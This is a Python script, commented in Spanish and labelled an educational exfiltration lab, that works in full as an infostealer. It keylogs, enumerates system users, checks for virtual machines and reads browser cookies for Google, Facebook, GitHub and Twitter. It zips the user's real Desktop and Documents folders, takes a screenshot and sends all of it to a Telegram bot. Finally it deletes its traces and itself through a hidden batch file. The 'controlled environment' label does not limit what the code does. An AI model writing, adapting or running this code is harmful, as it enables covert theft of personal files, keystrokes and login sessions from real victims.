#!/usr/bin/env python3
"""
LABORATORIO EDUCATIVO - Simulacion de Exfiltracion por Telegram
USO EXCLUSIVO EN ENTORNO CONTROLADO
"""

import subprocess
import sys
import os
import importlib
import socket
import threading
import time
import platform
import shutil
import zipfile
from datetime import datetime

# ==================== DEPENDENCIAS ====================
DEPENDENCIAS = {
    "requests": ("requests", "requests"),
    "pyautogui": ("pyautogui", "pyautogui"),
    "pynput": ("pynput", "pynput"),
    "PIL": ("PIL", "pillow"),
    "browser_cookie3": ("browser_cookie3", "browser-cookie3"),
    "psutil": ("psutil", "psutil"),
}

def instalar_pip_si_falta():
    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], capture_output=True, check=True)
        return True
    except:
        print("[!] pip no esta instalado. Instalando...")
        if sys.platform == "win32":
            import urllib.request
            urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", "get-pip.py")
            subprocess.run([sys.executable, "get-pip.py"], check=True)
            os.remove("get-pip.py")
        return True

def verificar_e_instalar_dependencias():
    print("\nVERIFICANDO DEPENDENCIAS")
    instalar_pip_si_falta()
    dependencias_faltantes = []
    for nombre_modulo, nombre_pip in DEPENDENCIAS.values():
        try:
            importlib.import_module(nombre_modulo)
            print(f"OK: {nombre_modulo}")
        except ImportError:
            print(f"FALTA: {nombre_modulo}")
            dependencias_faltantes.append(nombre_pip)
    if dependencias_faltantes:
        print("[*] Instalando dependencias faltantes automaticamente...")
        for pip_pkg in dependencias_faltantes:
            subprocess.run([sys.executable, "-m", "pip", "install", pip_pkg, "--quiet"])
    return True

# ==================== CONFIGURACION TELEGRAM ====================
TOKEN_BOT = ""
CHAT_ID = ""

# ==================== CLASE PRINCIPAL ====================
class LaboratorioExfiltracion:
    
    def __init__(self):
        self.token = TOKEN_BOT
        self.chat_id = CHAT_ID
        self.url_api = f"https://api.telegram.org/bot{self.token}"
        self.archivos_creados = []
        self.teclas_capturadas = []
        self.keylogger_activo = True
        self.keylogger_tiempo = 20  # segundos
    
    def enviar_mensaje(self, mensaje):
        try:
            import requests
            requests.post(f"{self.url_api}/sendMessage", json={"chat_id": self.chat_id, "text": mensaje}, timeout=10)
        except:
            pass
    
    def enviar_archivo(self, ruta, caption=""):
        if not os.path.exists(ruta):
            return False
        try:
            import requests
            with open(ruta, 'rb') as f:
                requests.post(f"{self.url_api}/sendDocument", data={"chat_id": self.chat_id, "caption": caption}, files={"document": f}, timeout=30)
            return True
        except:
            return False
    
    def enviar_foto(self, ruta, caption=""):
        if not os.path.exists(ruta):
            return False
        try:
            import requests
            with open(ruta, 'rb') as f:
                requests.post(f"{self.url_api}/sendPhoto", data={"chat_id": self.chat_id, "caption": caption}, files={"photo": f}, timeout=30)
            return True
        except:
            return False
    
    def obtener_info_sistema(self):
        import platform
        from datetime import datetime
        import psutil
        
        info = {
            "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": platform.node(),
            "sistema": platform.system(),
            "version": platform.release(),
            "arquitectura": platform.machine(),
            "usuario": os.getlogin() if hasattr(os, 'getlogin') else "desconocido",
        }
        
        try:
            info["ram_total_gb"] = round(psutil.virtual_memory().total / (1024**3), 2)
            info["disco_libre_gb"] = round(psutil.disk_usage('/').free / (1024**3), 2)
        except:
            pass
        
        try:
            if platform.system() == "Windows":
                resultado = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
                for linea in resultado.stdout.splitlines():
                    if "IPv4" in linea:
                        info["ip_local"] = linea.split(":")[-1].strip()
                        break
        except:
            info["ip_local"] = "No disponible"
        
        return info
    
    def listar_usuarios(self):
        usuarios = []
        if sys.platform == "win32":
            try:
                resultado = subprocess.run(['net', 'user'], capture_output=True, text=True, timeout=10)
                lineas = resultado.stdout.splitlines()
                for linea in lineas:
                    if '----' not in linea and 'comando' not in linea.lower():
                        partes = linea.split()
                        for parte in partes:
                            if parte and len(parte) > 2:
                                usuarios.append(parte)
            except:
                usuarios.append("Error")
        else:
            try:
                with open('/etc/passwd', 'r') as f:
                    for linea in f:
                        if ':/home/' in linea or ':/root:' in linea:
                            usuario = linea.split(':')[0]
                            usuarios.append(usuario)
            except:
                usuarios.append("Error")
        return usuarios[:20]
    
    def detectar_virtualizacion(self):
        resultado = {"es_virtual": False, "tipo": "Sistema nativo"}
        procesos_virtualizacion = ["vboxservice", "vboxtray", "vmtoolsd", "VMwareTray", "xenserver", "qemu-ga"]
        try:
            if sys.platform == "win32":
                resultado_procesos = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
                for proc in procesos_virtualizacion:
                    if proc.lower() in resultado_procesos.stdout.lower():
                        resultado["es_virtual"] = True
                        if "vbox" in proc.lower():
                            resultado["tipo"] = "VirtualBox"
                        elif "vmware" in proc.lower():
                            resultado["tipo"] = "VMware"
                        break
        except:
            pass
        try:
            if sys.platform == "win32":
                resultado_system = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=10)
                if "virtualbox" in resultado_system.stdout.lower():
                    resultado["es_virtual"] = True
                    resultado["tipo"] = "VirtualBox"
                elif "vmware" in resultado_system.stdout.lower():
                    resultado["es_virtual"] = True
                    resultado["tipo"] = "VMware"
        except:
            pass
        return resultado
    
    def listar_archivos(self, directorio):
        archivos = []
        if not os.path.exists(directorio):
            return archivos
        try:
            for item in os.listdir(directorio):
                ruta = os.path.join(directorio, item)
                if os.path.isfile(ruta):
                    tamaño = os.path.getsize(ruta)
                    archivos.append({"nombre": item, "tamaño_kb": round(tamaño / 1024, 2)})
                if len(archivos) >= 15:
                    break
        except:
            pass
        return archivos
    
    def copiar_directorios(self):
        """Copia solo Desktop y Documents en una carpeta temporal"""
        print("[*] Copiando Desktop y Documents...")
        
        usuario = os.path.expanduser("~")
        desktop = os.path.join(usuario, "Desktop")
        documents = os.path.join(usuario, "Documents")
        
        carpeta_destino = os.path.join(desktop, "temp_datos")
        os.makedirs(carpeta_destino, exist_ok=True)
        
        if os.path.exists(desktop):
            try:
                destino = os.path.join(carpeta_destino, "Escritorio")
                shutil.copytree(desktop, destino, dirs_exist_ok=True, ignore_dangling_symlinks=True)
                print(f"   [✓] Escritorio copiado")
            except Exception as e:
                print(f"   [✗] Error copiando Escritorio: {e}")
        
        if os.path.exists(documents):
            try:
                destino = os.path.join(carpeta_destino, "Documentos")
                shutil.copytree(documents, destino, dirs_exist_ok=True, ignore_dangling_symlinks=True)
                print(f"   [✓] Documentos copiados")
            except Exception as e:
                print(f"   [✗] Error copiando Documentos: {e}")
        
        zip_path = os.path.join(desktop, "datos_usuario.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(carpeta_destino):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, carpeta_destino)
                    zipf.write(file_path, arcname)
        
        self.archivos_creados.append(carpeta_destino)
        self.archivos_creados.append(zip_path)
        return zip_path
    
    def robar_cookies(self):
        resultado = []
        try:
            import browser_cookie3
            try:
                cj = browser_cookie3.chrome()
                resultado.append("Cookies de Chrome obtenidas")
                dominios = ['facebook', 'google', 'gmail', 'github', 'twitter']
                for cookie in cj:
                    for d in dominios:
                        if d in cookie.domain:
                            valor = cookie.value[:30] if len(cookie.value) > 30 else cookie.value
                            resultado.append(f"   {cookie.domain}: {cookie.name}={valor}")
                            break
            except:
                resultado.append("Chrome: cerrar Chrome primero para leer cookies")
            try:
                cj = browser_cookie3.firefox()
                resultado.append("Cookies de Firefox obtenidas")
            except:
                pass
            try:
                cj = browser_cookie3.edge()
                resultado.append("Cookies de Edge obtenidas")
            except:
                pass
        except:
            resultado.append("No se pudo importar browser_cookie3")
        return "\n".join(resultado)
    
    def crear_archivos_demo(self):
        escritorio = os.path.expanduser("~/Desktop")
        archivos_demo = [
            ("credenciales_laboratorio.txt", "usuario: lab_user\ncontraseña: LabPass2025!"),
            ("configuracion_lab.ini", "[DB]\nuser=admin\npassword=Secret123"),
            ("datos_personales.txt", "nombre: Juan Perez\nemail: juan@mail.com")
        ]
        encontrados = []
        for nombre, contenido in archivos_demo:
            ruta = os.path.join(escritorio, nombre)
            with open(ruta, 'w') as f:
                f.write(contenido)
            encontrados.append({"nombre": nombre, "ruta": ruta})
            self.archivos_creados.append(ruta)
        return encontrados
    
    def tomar_captura(self):
        try:
            import pyautogui
            from datetime import datetime
            nombre = f"captura_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            ruta = os.path.join(os.path.expanduser("~/Desktop"), nombre)
            pyautogui.screenshot(ruta)
            self.archivos_creados.append(ruta)
            print(f"Captura guardada en: {ruta}")
            return ruta
        except Exception as e:
            print(f"Error tomando captura: {e}")
            return None
    
    def keylogger(self):
        """Keylogger que captura teclas por 20 segundos"""
        print(f"[*] Keylogger activado por {self.keylogger_tiempo} segundos")
        
        try:
            from pynput import keyboard
            import time
            
            def on_press(key):
                try:
                    if self.keylogger_activo:
                        if hasattr(key, 'char') and key.char:
                            self.teclas_capturadas.append(key.char)
                        else:
                            self.teclas_capturadas.append(f"[{key.name}]")
                except:
                    pass
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            # Esperar el tiempo configurado
            for i in range(self.keylogger_tiempo, 0, -1):
                print(f"Grabando... {i} segundos restantes", end='\r')
                time.sleep(1)
            print("\n[*] Keylogger detenido")
            
            self.keylogger_activo = False
            listener.stop()
            
        except Exception as e:
            print(f"Error en keylogger: {e}")
    
    def autodestruccion(self):
        print("\nLIMPIANDO RASTROS")
        for ruta in self.archivos_creados:
            if os.path.exists(ruta):
                try:
                    if os.path.isdir(ruta):
                        shutil.rmtree(ruta)
                    else:
                        os.remove(ruta)
                    print(f"Eliminado: {os.path.basename(ruta)}")
                except:
                    pass
        script_actual = os.path.abspath(sys.argv[0])
        if sys.platform == "win32":
            batch_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"cleanup_{int(time.time())}.bat")
            with open(batch_file, "w") as f:
                f.write(f'''@echo off
timeout /t 2 /nobreak > nul
del /f /q "{script_actual}" > nul 2>&1
del /f /q "%~f0" > nul 2>&1
''')
            subprocess.Popen([batch_file], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print("Script eliminado")
    
    def ejecutar(self):
        import time
        print("INICIANDO SIMULACION DE ATAQUE")
        self.enviar_mensaje("[ATAQUE] Iniciando reconocimiento")
        
        # Iniciar keylogger en un hilo separado
        import threading
        keylogger_thread = threading.Thread(target=self.keylogger, daemon=True)
        keylogger_thread.start()
        
        info = self.obtener_info_sistema()
        self.enviar_mensaje(f"[SISTEMA] Host: {info['hostname']} | IP Local: {info.get('ip_local', 'No disponible')}")
        
        usuarios = self.listar_usuarios()
        if usuarios:
            self.enviar_mensaje(f"[USUARIOS] {', '.join(usuarios[:10])}")
        
        virt = self.detectar_virtualizacion()
        self.enviar_mensaje(f"[VIRTUAL] {virt['tipo']}")
        
        archivos_escritorio = self.listar_archivos(os.path.expanduser("~/Desktop"))
        if archivos_escritorio:
            self.enviar_mensaje(f"[ARCHIVOS ESCRITORIO] {len(archivos_escritorio)} archivos")
        
        cookies = self.robar_cookies()
        if cookies:
            self.enviar_mensaje(f"[COOKIES] {cookies[:300]}")
        
        archivos_creados = self.crear_archivos_demo()
        for a in archivos_creados:
            self.enviar_archivo(a['ruta'], a['nombre'])
        
        # Copiar Desktop + Documents
        zip_path = self.copiar_directorios()
        if zip_path and os.path.exists(zip_path):
            self.enviar_archivo(zip_path, "Datos del usuario (Desktop + Documents)")
            print("Datos del usuario enviados a Telegram")
        
        captura = self.tomar_captura()
        if captura:
            self.enviar_foto(captura, "Captura de pantalla")
            print("Captura de pantalla enviada a Telegram")
        
        # Esperar a que el keylogger termine (20 segundos)
        keylogger_thread.join(timeout=25)
        
        # Enviar teclas capturadas
        if self.teclas_capturadas:
            texto = ''.join(self.teclas_capturadas)
            self.enviar_mensaje(f"[TECLAS CAPTURADAS] {texto[:500]}")
            print("Teclas capturadas enviadas a Telegram")
        else:
            self.enviar_mensaje("[TECLAS CAPTURADAS] No se capturaron teclas")
        
        self.enviar_mensaje("[FIN] Ataque simulado completado")
        time.sleep(3)
        self.autodestruccion()

# ==================== FUNCIONES DE VERIFICACION ====================
def verificar_configuracion():
    if not TOKEN_BOT or TOKEN_BOT == "":
        print("ERROR: Token no configurado")
        return False
    if not CHAT_ID or CHAT_ID == "":
        print("ERROR: Chat ID no configurado")
        return False
    try:
        import requests
        url = f"https://api.telegram.org/bot{TOKEN_BOT}/getMe"
        respuesta = requests.get(url, timeout=10)
        if respuesta.status_code == 200 and respuesta.json().get('ok'):
            print(f"Bot conectado: @{respuesta.json()['result']['username']}")
            return True
    except Exception as e:
        print(f"Error de conexion con Telegram: {e}")
    return False

# ==================== PUNTO DE ENTRADA ====================
if __name__ == "__main__":
    print("LABORATORIO EDUCATIVO - Simulacion de Ataque")
    if not verificar_e_instalar_dependencias():
        print("Error instalando dependencias")
        sys.exit(1)
    if not verificar_configuracion():
        print("No se pudo conectar a Telegram. Asegurate de tener internet.")
        sys.exit(1)
    lab = LaboratorioExfiltracion()
    lab.ejecutar()